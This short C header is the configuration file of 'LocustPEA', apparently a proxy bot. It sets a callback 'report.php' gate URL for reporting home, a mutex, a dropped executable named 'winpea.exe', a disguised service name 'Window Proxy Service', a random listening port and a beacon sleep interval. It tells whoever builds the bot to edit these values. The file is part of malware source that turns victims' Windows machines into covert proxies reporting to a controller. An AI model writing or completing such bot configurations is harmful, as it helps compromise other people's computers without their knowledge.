/**
 * LocustPEA
 * Copyright ©2009 Loki - All Rights Reserved
 **/

#pragma once

#define CONF_RANDOM_PORT
#define     USEGATE
	
/* README!!!
EDIT CONFIG BELOW AND SEE *EDITME* section in report.cpp
!!README*/

//Proxy reporting url for "report.php"
char url[]     = "http://host/lol/report.php";

#define conf_sleep_time 420 // 7 hours
#define conf_mutex "1XtyXeo3Kd"
#define conf_file_name "winpea.exe" 
#define conf_name "Window Proxy Service"
#ifndef CONF_RANDOM_PORT
#   define conf_port 5000
#endif // CONF_RANDOM_PORT

